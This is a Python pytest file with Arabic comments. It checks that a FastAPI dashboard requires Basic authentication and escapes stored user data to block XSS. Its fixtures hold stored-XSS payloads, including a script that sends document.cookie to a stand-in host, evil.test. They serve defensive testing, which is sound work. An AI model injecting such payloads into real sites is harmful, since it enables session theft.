"""
اختبارات أمن لوحة التحكم:
1) مصادقة Basic إلزامية على كل /dashboard/* و /api/* بينما تبقى /health و /status عامة.
2) تهريب (escaping) بيانات المستخدم في الصفحات الجدولية — يمنع XSS مخزّنة
   (كانت تُبنى HTML خامًا عبر f-string ثم تُعلَّم |safe).
"""

import base64
from decimal import Decimal

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

import app.main as api
from app.database import models  # noqa: F401  (تسجيل الجداول على Base.metadata)
from app.database.db import Base

USER = "admin"
PASSWORD = "s3cr3t-password"

XSS_DESCRIPTION = "<script>fetch('//evil.test/?'+document.cookie)</script>"
XSS_PERSON = '<img src=x onerror="alert(1)">'
XSS_CATEGORY = "<svg/onload=alert(2)>"


def _auth_header(user: str = USER, password: str = PASSWORD) -> dict:
    token = base64.b64encode(f"{user}:{password}".encode()).decode("ascii")
    return {"Authorization": f"Basic {token}"}


@pytest.fixture
def db_session():
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(engine)
    TestingSession = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    session = TestingSession()
    try:
        yield session
    finally:
        session.close()
        Base.metadata.drop_all(engine)
        engine.dispose()


@pytest.fixture(autouse=True)
def _creds(monkeypatch):
    monkeypatch.setattr(api, "_DASHBOARD_USERNAME", USER)
    monkeypatch.setattr(api, "_DASHBOARD_PASSWORD", PASSWORD)


@pytest.fixture
def client(db_session):
    api.app.dependency_overrides[api.get_db] = lambda: db_session
    with TestClient(api.app) as c:
        yield c
    api.app.dependency_overrides.pop(api.get_db, None)


def _seed_xss_rows(db_session):
    db_session.add(
        models.Transaction(
            telegram_user_id=1,
            type="expense",
            amount=Decimal("10.00"),
            currency="ILS",
            person=XSS_PERSON,
            category=XSS_CATEGORY,
            description=XSS_DESCRIPTION,
            raw_message="x",
        )
    )
    db_session.add(
        models.Note(
            telegram_user_id=1,
            note_type="note",
            description=XSS_DESCRIPTION,
            person=XSS_PERSON,
            category=XSS_CATEGORY,
            raw_message="x",
        )
    )
    db_session.add(
        models.Task(
            telegram_user_id=1,
            description=XSS_DESCRIPTION,
            person=XSS_PERSON,
            status="pending",
            raw_message="x",
        )
    )
    db_session.commit()


def test_dashboard_pages_escape_user_input(client, db_session):
    """البيانات المخزّنة تُعرض مُهرَّبة — لا تُنفَّذ كـ HTML/Script."""
    _seed_xss_rows(db_session)

    resp = client.get("/dashboard/transactions", headers=_auth_header())
    assert resp.status_code == 200
    for raw in (XSS_DESCRIPTION, XSS_PERSON, XSS_CATEGORY):
        assert raw not in resp.text
    assert "&lt;script&gt;" in resp.text
    assert "&lt;img src=x" in resp.text
    assert "&lt;svg" in resp.text

    resp = client.get("/dashboard/tasks", headers=_auth_header())
    assert resp.status_code == 200
    assert XSS_DESCRIPTION not in resp.text and XSS_PERSON not in resp.text
    assert "&lt;script&gt;" in resp.text and "&lt;img src=x" in resp.text

    resp = client.get("/dashboard/notes", headers=_auth_header())
    assert resp.status_code == 200
    assert XSS_DESCRIPTION not in resp.text and XSS_PERSON not in resp.text
    assert "&lt;script&gt;" in resp.text and "&lt;img src=x" in resp.text


def test_api_returns_raw_json_but_html_never_unescaped(client, db_session):
    """JSON API يسلّم البيانات كما هي (لا HTML)، لكن صفحات اللوحة وحدها تُهرَّب."""
    _seed_xss_rows(db_session)
    resp = client.get("/api/transactions", headers=_auth_header())
    assert resp.status_code == 200
    assert XSS_DESCRIPTION in resp.text  # JSON خام — يُحرَّر برمجيًا فقط


def test_all_dashboard_and_api_routes_require_auth(client):
    protected = [
        "/dashboard",
        "/dashboard/transactions",
        "/dashboard/tasks",
        "/dashboard/notes",
        "/dashboard/budgets",
        "/api/transactions",
        "/api/tasks",
        "/api/budgets",
    ]
    for path in protected:
        assert client.get(path).status_code == 401, f"{path} يجب أن يرفض بلا مصادقة"
    # بيانات صحيحة تكفي للوصول
    for path in protected:
        resp = client.get(path, headers=_auth_header())
        assert resp.status_code == 200, f"{path} يجب أن يُقبل بالمصادقة"


def test_wrong_credentials_rejected(client):
    wrong = _auth_header(password="wrong")
    assert client.get("/dashboard/transactions", headers=wrong).status_code == 401
    assert client.get("/api/transactions", headers=wrong).status_code == 401


def test_health_endpoints_remain_public(client):
    assert client.get("/health").status_code == 200
    assert client.get("/status").status_code == 200
    assert client.get("/").status_code == 200
